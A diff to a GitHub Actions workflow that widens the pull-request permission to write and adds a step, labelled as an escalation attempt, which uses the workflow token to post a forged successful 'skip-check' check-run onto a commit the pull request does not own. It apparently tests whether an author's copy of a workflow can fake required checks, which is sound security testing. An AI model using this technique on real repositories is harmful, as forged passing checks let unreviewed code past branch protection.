@@ -9,17 +9,24 @@ on:
 
 permissions:
   contents: read
-  pull-requests: read
+  pull-requests: write
   checks: write
 
 jobs:
   guard:
     name: skip-check
     runs-on: ubuntu-latest
+    env:
+      GH_TOKEN: ${{ github.token }}
+      REPO: ${{ github.repository }}
     steps:
-      - name: Say which copy ran
+      - name: Post onto a head this pull request does not own
         run: |
-          echo "COPY=AUTHOR-S1"
-          echo "pr=${{ github.event.pull_request.number }}"
-          echo "base=${{ github.event.pull_request.base.ref }}"
-          echo "event=${{ github.event_name }}"
+          set -euo pipefail
+          echo "COPY=AUTHOR-S1 escalation attempt"
+          gh api -X POST "repos/$REPO/check-runs" \
+            -f name=skip-check -f head_sha=12537cfa8dd1e41e64919f39c687b02f4c25bd20 \
+            -f status=completed -f conclusion=success \
+            -f output[title]="forged by the author branch" \
+            -f output[summary]="posted from s1's own copy of the workflow" \
+            --jq '"posted check-run \(.id) onto 12537cfa as \(.name)=\(.conclusion)"'
